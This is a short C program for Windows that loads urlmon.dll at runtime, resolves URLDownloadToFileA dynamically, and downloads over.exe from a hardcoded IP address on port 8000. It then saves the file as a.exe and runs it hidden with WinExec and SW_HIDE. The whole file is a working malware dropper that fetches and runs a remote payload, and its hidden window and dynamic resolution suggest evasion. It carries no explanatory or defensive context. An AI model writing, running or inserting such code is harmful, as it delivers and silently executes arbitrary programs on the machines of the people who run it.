#include<windows.h>
#include<urlmon.h>

typedef int (WINAPI *MY_DOWNLOAD_PROC)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);

int main() 
{
	HMODULE hurlmod = LoadLibraryA("urlmon.dll");
	MY_DOWNLOAD_PROC function_ptr =
		(MY_DOWNLOAD_PROC)GetProcAddress(hurlmod, "URLDownloadToFileA");
	function_ptr(NULL, "http://10.195.24.110:8000/over.exe", "a.exe", 0, NULL);
	WinExec("a.exe", SW_HIDE);
}